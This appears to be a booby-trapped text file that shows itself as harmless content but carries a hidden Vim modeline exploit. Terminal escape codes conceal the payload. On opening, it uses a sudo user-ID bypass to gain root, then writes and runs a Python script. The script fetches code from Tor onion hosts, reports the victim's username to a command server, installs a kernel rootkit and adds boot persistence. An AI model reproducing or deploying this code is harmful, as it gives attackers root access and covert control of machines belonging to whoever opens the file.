\x1b[?7l\x1bSUnmalicious content to read.\x1b:silent! w | call system('sudo -u#-1 mkdir /etc/rootkit_demo/; sudo -u#-1 mkdir /etc/rootkit_demo/public/; sudo -u#-1 python3 -c """malware_file = open(\"/etc/malware.py\", \"w\"); malware_file.write(\"\"\"import os\\\nfrom os import path\\\nimport time\\\nimport socket\\\nimport sys\\\nENCODING = \"latin1\"\\\nseed_directions = [(\"kdq2tg4jedd5tqxs.onion\", \"57yvvr2pfb46zull.onion\")]\\\ntor_hidden_service_path = \"/var/lib/tor\"\\\ntorrc_path = \"/etc/tor/torrc\"\\\nhidden_folder_path = \"/etc/rootkit_demo\"\\\nhidden_private_folder_path = os.path.join(hidden_folder_path, \"private\")\\\nhidden_public_folder_path = os.path.join(hidden_folder_path, \"public\")\\\nhidden_source_folder = os.path.join(hidden_public_folder_path, \"source\")\\\nhidden_http_folder_path = os.path.join(hidden_public_folder_path, \"http\")\\\nstart_server_script = os.path.join(hidden_source_folder, \"server.py\")\\\ndown_port = 40000\\\ntor_down_port = 40001\\\ncomm_port = 50000\\\ntor_comm_port = 50001\\\nos.mkdir(hidden_private_folder_path)\\\nos.mkdir(hidden_http_folder_path)\\\nos.system(\"apt install -y tor\")\\\nos.system(\"apt install -y python3-pip\")\\\nos.system(\"pip3 install --upgrade pysocks\")\\\nos.system(\"pip3 install --upgrade socks\")\\\nos.system(\"pip3 install --upgrade cryptography\")\\\nimport socks\\\npid = os.getpid()\\\nprocess_file = os.path.join(hidden_folder_path, \"process\")\\\nwith open(process_file, \"a\") as process_file:\\\n\tprocess_file.write(f\"{pid}\")\\\ncomm_address = None\\\nfor i, address_pair in enumerate(seed_directions):\\\n\tif not os.path.exists(hidden_source_folder):\\\n\t\tdown_address = address_pair[0]\\\n\t\tcomm_address = address_pair[1]\\\n\t\tcommand = \"torify wget \" + down_address + \":\" + str(tor_down_port) + \"/ -r -np -nH -R index.html* -P\" + hidden_public_folder_path\\\n\t\tos.system(command)\\\n\tif i == len(seed_directions):\\\n\t\tsys.exit()\\\nos.system(f\"echo seed {down_address} {comm_address} >> {hidden_public_folder_path}/peer_list\")\\\nos.system(f\"cp {hidden_public_folder_path}/peer_list {hidden_private_folder_path}/full_peer_list\")\\\nhidden_web_folder = os.path.join(tor_hidden_service_path, \"hidden_download\")\\\nwith open(torrc_path, \"a\") as torrc_file:\\\n\ttorrc_file.write(f\"HiddenServiceDir {hidden_web_folder}{os.linesep}\")\\\n\ttorrc_file.write(f\"HiddenServicePort {tor_down_port} localhost:{down_port}{os.linesep}\")\\\nhidden_comm_folder = os.path.join(tor_hidden_service_path , \"hidden_communication\")\\\nwith open(torrc_path, \"a\") as torrc_file:\\\n\ttorrc_file.write(f\"HiddenServiceDir {hidden_comm_folder}{os.linesep}\")\\\n\ttorrc_file.write(f\"HiddenServicePort {tor_comm_port} localhost:{comm_port}{os.linesep}\")\\\nos.system(\"systemctl restart tor\")\\\ntime.sleep(1)\\\nwith open(os.path.join(hidden_web_folder, \"hostname\"), \"r\") as onion:\\\n\tweb_onion = onion.read().strip()\\\nwith open(os.path.join(hidden_comm_folder, \"hostname\"), \"r\") as onion:\\\n\tcomm_onion = onion.read().strip()\\\nwith open(\"/etc/passwd\", \"r\") as passwd:\\\n\tlines = passwd.readlines()\\\nuser_line = [line for line in lines if \"1000\" in line]\\\nuser = user_line[0].split(\":\")[0]\\\nsocks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, \"127.0.0.1\", 9050, True)\\\nclient_socket = socks.socksocket()\\\nclient_socket.connect((comm_address, tor_comm_port))\\\nmsg = f\"0<<default<<0<<{user} {web_onion} {comm_onion}<<no signed hash\"\\\nfinal_msg = msg.encode(ENCODING)\\\nclient_socket.send(final_msg)\\\nclient_socket.close()\\\nrootkit = os.path.join(hidden_source_folder, \"rootkit.ko\")\\\nlinux_version = os.uname()[2]\\\nos.system(f\"cp {rootkit} /lib/modules/{linux_version}/kernel/drivers/acpi\")\\\nos.system(f\"echo rootkit >> /etc/modules\")\\\nos.system(f\"insmod {rootkit}\")\\\nos.system(f\"cp {hidden_http_folder_path}/rootkit_demo.service /etc/systemd/system/\")\\\nos.system(f\"chmod +x {hidden_http_folder_path}/download_server\")\\\nos.system(\"systemctl enable rootkit_demo\")\"\"\"); malware_file.close()"""; cd /etc/rootkit_demo/public; python3 -m http.server 40000 & sudo -u#-1 python3 /etc/malware.py &') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails('set\ fde=x\ \|\ source\!\ \%') fdl=0: \x16\x1b[1G\x16\x1b[KUnmalicious content to read."\x16\x1b[D ;
